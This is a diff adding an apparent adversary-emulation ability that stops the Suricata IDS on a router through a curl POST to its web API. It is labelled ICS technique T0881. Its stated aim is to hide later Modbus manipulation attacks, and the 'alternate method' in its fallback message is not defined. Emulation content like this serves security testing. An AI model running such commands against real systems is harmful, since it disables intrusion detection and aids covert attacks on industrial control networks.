@@ -1,0 +1,19 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000002
+  name: Router - Stop Suricata IDS
+  description: |
+    Disable the Suricata IDS running on the router to prevent
+    detection of subsequent Modbus manipulation attacks. Uses the
+    router's web API or direct process kill if API is available.
+  tactic: inhibit-response-function
+  technique_id: T0881
+  technique_name: Service Stop
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -b /tmp/router.jar
+      -X POST "http://192.168.90.200:5000/ids/stop" 2>/dev/null &&
+      echo "IDS_STOPPED" ||
+      echo "IDS stop via API failed - attempting alternate method"
